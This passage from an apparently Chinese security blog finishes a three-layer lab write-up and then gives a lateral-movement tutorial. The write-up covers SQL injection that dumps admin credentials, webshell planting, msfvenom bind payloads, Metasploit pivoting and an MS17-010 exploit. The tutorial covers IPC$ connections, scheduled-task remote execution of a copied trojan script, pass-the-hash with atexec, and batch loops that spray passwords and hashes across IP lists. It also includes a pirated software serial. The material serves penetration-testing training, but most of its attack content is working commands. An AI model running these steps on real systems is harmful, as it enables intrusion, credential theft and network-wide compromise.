class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329185049507.png" alt="image-20220329185049507"></p>
</li>
<li><p>获取<strong>bagecms数据库</strong>下的所有表名</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.22.22</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>&#x27; union select group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span> from information_schema.tables where table_schema=&#x27;bagecms&#x27;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329191110591.png" alt="image-20220329191110591"></p>
</li>
<li><p>获取<strong>bagecms数据库</strong>下的<strong>bage_admin表</strong>中所有字段</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.22.22</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>&#x27; union select group_concat(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span> from information_schema.columns where table_name=&#x27;bage_admin&#x27;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329191034198.png" alt="image-20220329191034198"></p>
</li>
<li><p>获取<strong>bagecms数据库</strong>下的<strong>bage_admin表</strong>中字段<strong>username</strong>和<strong>password</strong>的值</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.22.22</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>&#x27; union select group_concat(username),group_concat(password),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span> from bage_admin%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329191015201.png" alt="image-20220329191015201"></p>
<p>密码通过somd5解密如下</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329190949213.png" alt="image-20220329190949213"></p>
</li>
<li><p>综上获得用户名：<strong>admin</strong>，密码：<strong>123qwe</strong></p>
</li>
</ol>
<p>用获得的用户名和密码去后台登录，进去便得到第二个flag</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329210529861.png" alt="image-20220329210529861"></p>
<p>在后台翻找，发现这里可以直接修改**/tag/下的index.php**的内容<img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329213818228.png" alt="image-20220329213818228"></p>
<p>我直接写个🐴进去</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329213748834.png" alt="image-20220329213748834"></p>
<p>但是我这里又遇到问题了，不管是Proxifier或SocksCap64做代理用caidao去连，还是用蚁剑自带的代理设置去连，都没有成功</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330123630813.png" alt="image-20220330123630813"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330125727308.png" alt="image-20220330125727308"></p>
<p>折磨了我一晚上第二天早上又折磨了一上午，最后在网上看到说可能是宝塔有拦截，用冰蝎可以连，于是我就上了冰蝎的🐴</p>
<p>终于成功了！！！！！雷姆😭</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330125057766.png" alt="image-20220330125057766"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330125017505.png" alt="image-20220330125017505"></p>
<p>要是还不成功我都想用一些奇怪的姿势去弄了，比如将target2反弹shell(通过写入命令执行到.php文件)给target1，taiget1利用<strong>portmap</strong>端口转发再反弹给kali的msf，来拿shell（<strong>详细参考:内网安全-域横向网络&amp;传输&amp;应用层隧道技术</strong>）</p>
<p>总之拿到shell就好，tnl</p>
<p>到此target2拿下，接下来是target3</p>
<p>这里插一句，做一个小记录，我最开始是想通过下图这个执行sql语句来写入webshell的，但是貌似没有写的权限，并且对<code>&lt;?php ?&gt;</code>有过滤，再加上也不知道网站根目录在哪，就没有深入了</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330134910010.png" alt="image-20220330134910010"></p>
<p>这里我们要继续到第三个靶机target3还需要借助target2来设置路由才能访问，所以需要将target2的shell交到msf手上</p>
<p>这里不能采用反向连接，因为target2是无法出网找到我们的kali的，所以需要我们的kali主动去绑定target2，所以msf在生成木马时会和反弹shell有不同</p>
<p>生成正向后门：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br><span class="line"><span class="comment"># 这里使用的是bind_tcp，而反弹时reverse_tcp</span></span><br><span class="line"><span class="comment"># elf是linux的可执行文件</span></span><br></pre></td></tr></table></figure>

<p>msf正向连接</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="builtin-name">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="builtin-name">set</span> rhost 192.168.22.22</span><br><span class="line"><span class="builtin-name">set</span> LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330142924770.png" alt="image-20220330142924770"></p>
<p>利用冰蝎去上传并执行后门</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330142309606.png" alt="image-20220330142309606"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330142933188.png" alt="image-20220330142933188"></p>
<p>msf得到获得session</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330143127979.png" alt="image-20220330143127979"></p>
<p>这里其实也可以不这么麻烦，冰蝎上有可以将不出网的主机反弹给msf的功能，同样能将冰蝎得到的shell反弹给msf</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330164132272.png" alt="image-20220330164132272"></p>
<p>信息收集及配置访问</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">获取网络接口：<span class="builtin-name">run</span> get_local_subnets</span><br><span class="line"></span><br><span class="line">查看路由地址：<span class="builtin-name">run</span> autoroute -p</span><br><span class="line"></span><br><span class="line">添加路由地址：<span class="builtin-name">run</span> autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330144253085.png" alt="image-20220330144253085"></p>
<p>使用msf自带的端口扫描，来探针存活主机</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="builtin-name">set</span> rhosts 192.168.33.0/24</span><br><span class="line"><span class="builtin-name">set</span> threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>探针到存活主机<code>192.168.33.33</code></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330151139120.png" alt="image-20220330151139120"></p>
<p>再用proxychains4+nmap来对192.168.33.33进行端口扫描，通过结果可以看出是一台windows</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330152401211.png" alt="image-20220330152401211"></p>
<p>这里猜测大概率存在永恒之蓝MS17-010</p>
<p>利用msf的攻击模块尝试去打</p>
<p>先search一下有哪些攻击模块</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330154444035.png" alt="image-20220330154444035"></p>
<p>选择<code>exploit/windows/smb/ms17_010_psexec</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选择攻击模块</span></span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置正向连接</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置攻击目标ip地址</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.33.33</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开打！</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>成功得到session</p>
<p>这里shell乱码，可以输入<code>chcp 65001</code>修改编码，就好了</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330162930441.png" alt="image-20220330162930441"></p>
<p>搜索flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">dir /S *flag* /B</span><br><span class="line"><span class="built_in">type</span> C:\Windows\System32\config\flag.txt</span><br><span class="line"><span class="comment"># /B 显示文件夹或文件的名字</span></span><br><span class="line"><span class="comment"># /S 显示指定目录和所有子目录中的文件。</span></span><br><span class="line"><span class="comment"># dir /S /B *flag* 这样写也可以</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220330163354812.png" alt="image-20220330163354812"></p>
<p>这里得到两个flag</p>
<p>到此三层内网靶机渗透完毕，芜湖起飞！🛫🛫🛫</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次打这个靶机可谓是困难重重，遇到好多非预期bug，看别人文章上顺的一批，自己就是死活弄不出，折磨了好几天，真是让我体会到，不是自己动手做过，真不知道其中的艰辛，看着别人一帆风顺，实则一大堆坑在等着，所以（实操&gt;&gt;理论）。不过结果是好的，有了第一次，下次也许就顺了吧，也许吧😇</p>
<h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/weixin_45447309/article/details/106907920">https://blog.csdn.net/weixin_45447309/article/details/106907920</a></p>
<p><a href="https://blog.csdn.net/li93675/article/details/81175883">https://blog.csdn.net/li93675/article/details/81175883</a></p>
<p><a href="https://xz.aliyun.com/t/10867">内网安全-隧道穿透漫游-先知社区</a></p>
<p><a href="https://www.t00ls.cc/articles-56377.html">为什么蚁剑连接成功了，但是再次执行命令就会reset【宝塔的服务器】</a></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>frp：<a href="https://github.com/fatedier/frp/releases/%EF%BC%88%E4%B8%8B%E8%BD%BD%E9%80%89%E6%8B%A9%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%EF%BC%8Clinux%E6%9F%A5%E7%9C%8B%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%60unam">https://github.com/fatedier/frp/releases/（下载选择对应版本，linux查看内核版本信息`unam</a> -a`）</p>
<p>CFS三层靶机环境：<a href="https://pan.baidu.com/s/1l5-TOVe9FO8mEjCiZ4mtMQ">https://pan.baidu.com/s/1l5-TOVe9FO8mEjCiZ4mtMQ</a> 提取码：xiao</p>
<p><a href="https://www.mediafire.com/file/zsav7zlz5u1vkpv/SocksCap64-setup-4.7.exe.7z/file0">SocksCap64下载</a></p>
<p><a href="https://www.proxifier.com/download/">Proxifier下载</a>—注册码序列号<strong>5EZ8G-C3WL5-B56YG-SCXM9-6QZAP</strong>（Standard Edition 安装版本）</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域横向批量at&amp;schtasks&amp;impacket</title>
    <url>/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&amp;schtasks&amp;impacket/</url>
    <content><![CDATA[<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220309210002253.png" alt="image-20220309210002253"></p>
<h2 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h2><p>at&amp;schtasks命令，可以在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>获取到某域主机权限-&gt;minikatz得到密码（明文，hash）-&gt;用到信息收集域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ol>
<li><strong>建立IPC链接</strong>到目标主机</li>
<li>拷贝要执行的命令脚本到目标主机</li>
<li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li>
<li>删除IPC链接</li>
</ol>
<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><p>(Inter Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p>
<p>通过ipc$可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p>
<h3 id="IPC相关操作"><a href="#IPC相关操作" class="headerlink" title="IPC相关操作"></a>IPC相关操作</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接工作组内主机</span></span><br><span class="line">net use \\IP\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接域内主机</span></span><br><span class="line">net use \\IP\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:域名\用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件列表（C盘）</span></span><br><span class="line"><span class="built_in">dir</span> \\IP\C<span class="variable">$</span>\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line"><span class="built_in">copy</span> \\IP\C<span class="variable">$</span>\<span class="number">1</span>.bat <span class="number">1</span>.bat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\IP\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除IPC</span></span><br><span class="line">net use \\IP\C<span class="variable">$</span>\<span class="number">1</span>.bat /<span class="built_in">del</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看对方共享</span></span><br><span class="line">net view IP</span><br></pre></td></tr></table></figure>



<h3 id="建立IPC常见的错误代码"><a href="#建立IPC常见的错误代码" class="headerlink" title="建立IPC常见的错误代码"></a>建立IPC常见的错误代码</h3><p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p>
<p>（2）51：网络问题，Windows无法找到网络路径</p>
<p>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题</p>
<p>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</p>
<p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立ipc$，需要先删除</p>
<p>（6）1326：账号密码错误</p>
<p>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况</p>
<p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>
<h3 id="建立IPC失败的原因"><a href="#建立IPC失败的原因" class="headerlink" title="建立IPC失败的原因"></a>建立IPC失败的原因</h3><p>（1）目标系统不是NT或以上的操作系统</p>
<p>（2）对方没有打开ipc$共享</p>
<p>（3）对方未开启139、445端口，或者被防火墙屏蔽</p>
<p>（4）输出命令、账号密码有错误</p>
<h2 id="at-amp-schtasks使用"><a href="#at-amp-schtasks使用" class="headerlink" title="at&amp;schtasks使用"></a>at&amp;schtasks使用</h2><h3 id="版本-lt-win2012-使用at"><a href="#版本-lt-win2012-使用at" class="headerlink" title="版本 &lt; win2012 使用at"></a>版本 &lt; win2012 使用at</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立ipc连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$</span> <span class="string">&quot;Admin12345&quot;</span> /user:god.org\administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝执行文件（木马）到目标机器</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加计划任务</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="number">23</span>:<span class="number">50</span> c:\add.bat</span><br></pre></td></tr></table></figure>



<h3 id="版本-gt-win2012-使用schtasks"><a href="#版本-gt-win2012-使用schtasks" class="headerlink" title="版本 &gt;= win2012 使用schtasks"></a>版本 &gt;= win2012 使用schtasks</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立ipc连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"><span class="comment"># 注意这里如果连接域用户可能会因权限不够导致之后拷贝文件不成功，所以这里连接的是本地administrator</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件（木马）到其C盘</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建adduser任务对应执行文件</span></span><br><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">3.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /<span class="built_in">sc</span> DAILY /tr c:\add.bat /F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行adduser任务</span></span><br><span class="line">schtasks /run /s <span class="number">192.168</span>.<span class="number">3.32</span> /tn adduser /i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除adduser任务</span></span><br><span class="line">schtasks /delete /s <span class="number">192.168</span>.<span class="number">3.21</span> /tn adduser /f</span><br></pre></td></tr></table></figure>



<h2 id="横向渗透明文、Hash传递-atexec-来自impacket网络协议工具包"><a href="#横向渗透明文、Hash传递-atexec-来自impacket网络协议工具包" class="headerlink" title="横向渗透明文、Hash传递-atexec(来自impacket网络协议工具包)"></a>横向渗透明文、Hash传递-atexec(来自impacket网络协议工具包)</h2><p>之前的at和schtasks只能传明文，传递密文使用atexec（这个工具还带有提权，whoami返回system），但这个是第三方文件，需要做免杀</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">atexec.exe ./用户名:密码@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe 域名/用户名:密码@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe <span class="literal">-hashes</span> 密码的hash值 ./用户名@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line">atexec.exe ./administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe <span class="literal">-hashes</span> :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="横向渗透明文、Hash传递批量利用"><a href="#横向渗透明文、Hash传递批量利用" class="headerlink" title="横向渗透明文、Hash传递批量利用"></a>横向渗透明文、Hash传递批量利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win自带命令+net use</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (IP.txt) <span class="keyword">do</span> net use \\%%i\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:用户名</span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># win自带命令+atexec</span></span><br><span class="line"><span class="comment">## 批量检测多IP对应一明文</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (IP.txt) <span class="keyword">do</span> atexec.exe ./用户名:密码<span class="selector-tag">@</span>%%i <span class="string">&quot;命令]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> atexec.exe ./administrator:admin!<span class="selector-tag">@</span><span class="comment">#45@%%i whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 批量检测多明文对应一IP</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./用户名:%%i@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./administrator:%%i@<span class="number">192.168</span>.<span class="number">3.21</span> whoami</span><br><span class="line"></span><br><span class="line"><span class="comment">## 批量检测多HASH对应一IP</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe <span class="literal">-hashes</span> %%i ./用户名@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe <span class="literal">-hashes</span> %%i ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> whoami</span><br></pre></td></tr></table></figure>

